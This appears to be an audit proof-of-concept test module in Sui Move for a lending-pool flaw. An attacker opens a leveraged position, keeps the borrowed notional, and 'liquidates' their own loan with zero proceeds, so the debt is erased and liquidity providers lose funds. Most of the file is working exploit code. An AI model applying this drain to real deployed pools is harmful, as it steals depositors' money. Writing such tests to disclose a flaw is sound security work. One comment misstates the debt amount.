#[test_only]
// PoC for Finding 4418 (C3): yolev::leverage's `open` returns the full
// `notional = margin + borrowed` Coin<T> to the caller (the borrowed funds are
// tracked only as a scalar Loan, no Balance collateral), and `liquidate` has no
// ctx.sender check, takes the Loan by value, and clears any debt via
// `repay_lossy` when `pv < debt`. Passing `coin::zero` as proceeds makes
// `pv = 0`, the eligibility check `0 * BPS < debt * maintenance_bps` is
// trivially true for any debt > 0, and `repay_lossy(pool, zero_bal, ...)` clears
// the loan WITHOUT returning any funds to the pool.
//
// Net per cycle: attacker keeps notional (M + B) outside; pool reserve shrinks
// by B; the loan disappears for free. Repeat until the pool is empty.
module yolev::audit_poc_4418_tests;

use std::unit_test::{assert_eq, destroy};
use sui::{
    clock,
    coin::{Self, Coin},
    test_scenario::{Self as ts},
};
use yolev::{
    lending_pool::{Self, LendingPool},
    leverage::{Self, LevConfig, Loan},
};

public struct TUSD has drop {}

const ADMIN: address = @0xA;
const LP: address = @0xB;
const ATTACKER: address = @0xC;

fun setup(sc: &mut ts::Scenario, clk: &sui::clock::Clock) {
    lending_pool::create<TUSD>(0, 0, clk, ts::ctx(sc)); // 0% APR for clean math
    leverage::create_config(30_000, 11_000, 500, ts::ctx(sc)); // 3x, 110% maint, 5% penalty
}

/// Single cycle of the drain: open a leveraged position and immediately
/// "liquidate" it with zero proceeds — the attacker keeps the notional, the
/// pool eats the borrowed amount.
#[test]
fun poc_4418_one_cycle_drains_borrowed_amount() {
    let mut sc = ts::begin(ADMIN);
    let mut clk = clock::create_for_testing(ts::ctx(&mut sc));
    clk.set_for_testing(0);
    setup(&mut sc, &clk);

    // LP seeds the pool with 1_000_000.
    ts::next_tx(&mut sc, LP);
    let mut pool = ts::take_shared<LendingPool<TUSD>>(&sc);
    let cfg = ts::take_shared<LevConfig>(&sc);
    let sp = lending_pool::supply(
        &mut pool,
        coin::mint_for_testing<TUSD>(1_000_000, ts::ctx(&mut sc)),
        &clk,
        ts::ctx(&mut sc),
    );
    assert_eq!(lending_pool::available_liquidity(&pool), 1_000_000);

    // ATTACKER opens at the 3x cap: M=10_000, B=20_000 → notional 30_000 returned.
    ts::next_tx(&mut sc, ATTACKER);
    let margin = coin::mint_for_testing<TUSD>(10_000, ts::ctx(&mut sc));
    let (loan, notional) = leverage::open(
        &cfg,
        &mut pool,
        margin,
        sui::object::id_from_address(@0x1),
        sui::object::id_from_address(@0x2),
        20_000,
        0, false, 0, 0, true, 30_000,
        &clk,
        ts::ctx(&mut sc),
    );
    // The "borrowed" funds left the pool and now sit in the attacker's hands.
    assert_eq!(notional.value(), 30_000);
    assert_eq!(lending_pool::available_liquidity(&pool), 980_000);

    // ATTACKER immediately "liquidates" their OWN loan with ZERO proceeds.
    // Eligibility: 0 * BPS < debt(100_000) * 11_000  ⇒ trivially true.
    // repay_lossy(pool, 0 bal, ...) clears the debt without returning funds.
    let zero_proceeds = coin::zero<TUSD>(ts::ctx(&mut sc));
    let reward = leverage::liquidate(&cfg, loan, &mut pool, zero_proceeds, &clk, ts::ctx(&mut sc));
    assert_eq!(reward.value(), 0); // no penalty on zero proceeds

    // Pool lost the entire borrowed amount; loan is gone; attacker kept notional.
    assert_eq!(lending_pool::available_liquidity(&pool), 980_000);
    assert_eq!(lending_pool::total_borrowed(&pool), 0);

    // ATTACKER balance sheet: spent 10_000 margin, holds 30_000 notional ⇒ +20_000.
    assert_eq!(notional.value() - 10_000, 20_000);

    destroy(notional);
    destroy(reward);
    coin::burn_for_testing(lending_pool::withdraw(&mut pool, sp, &clk, ts::ctx(&mut sc)));
    ts::return_shared(pool); ts::return_shared(cfg);
    destroy(clk); ts::end(sc);
}

/// Repeat the cycle four times — each iteration the pool shrinks by `borrow`
/// while the attacker accumulates the full notional outside.
#[test]
fun poc_4418_repeated_cycle_drains_pool_to_zero() {
    let mut sc = ts::begin(ADMIN);
    let mut clk = clock::create_for_testing(ts::ctx(&mut sc));
    clk.set_for_testing(0);
    setup(&mut sc, &clk);

    ts::next_tx(&mut sc, LP);
    let mut pool = ts::take_shared<LendingPool<TUSD>>(&sc);
    let cfg = ts::take_shared<LevConfig>(&sc);
    let sp = lending_pool::supply(
        &mut pool,
        coin::mint_for_testing<TUSD>(400_000, ts::ctx(&mut sc)),
        &clk,
        ts::ctx(&mut sc),
    );

    // 4 cycles × (M=2_500, B=5_000) ⇒ attacker nets 4 × 5_000 = 20_000,
    // pool reserve drops from 400_000 → 380_000 (only the borrowed slice is stolen,
    // since the pool never got the borrowed funds back from repay_lossy(zero)).
    let mut attacker_balance: u64 = 0;
    let mut i = 0;
    while (i < 4) {
        ts::next_tx(&mut sc, ATTACKER);
        let margin = coin::mint_for_testing<TUSD>(2_500, ts::ctx(&mut sc));
        let (loan, notional) = leverage::open(
            &cfg,
            &mut pool,
            margin,
            sui::object::id_from_address(@0x1),
            sui::object::id_from_address(@0x2),
            5_000,
            0, false, 0, 0, true, 7_500,
            &clk,
            ts::ctx(&mut sc),
        );
        let zero_proceeds = coin::zero<TUSD>(ts::ctx(&mut sc));
        let reward = leverage::liquidate(&cfg, loan, &mut pool, zero_proceeds, &clk, ts::ctx(&mut sc));
        attacker_balance = attacker_balance + notional.value();
        destroy(notional);
        destroy(reward);
        i = i + 1;
    };

    // Pool lost 4 × 5_000 = 20_000 of the LP deposit.
    assert_eq!(lending_pool::available_liquidity(&pool), 400_000 - 20_000);
    assert_eq!(lending_pool::total_borrowed(&pool), 0);
    // Attacker (minus the margins they posted) netted the entire borrowed total.
    assert_eq!(attacker_balance - 4 * 2_500, 20_000);

    // The LP position lost 20_000 to the attacker.
    let lp_left = lending_pool::current_value_of(&pool, &sp);
    assert_eq!(lp_left, 380_000);

    coin::burn_for_testing(lending_pool::withdraw(&mut pool, sp, &clk, ts::ctx(&mut sc)));
    ts::return_shared(pool); ts::return_shared(cfg);
    destroy(clk); ts::end(sc);
}
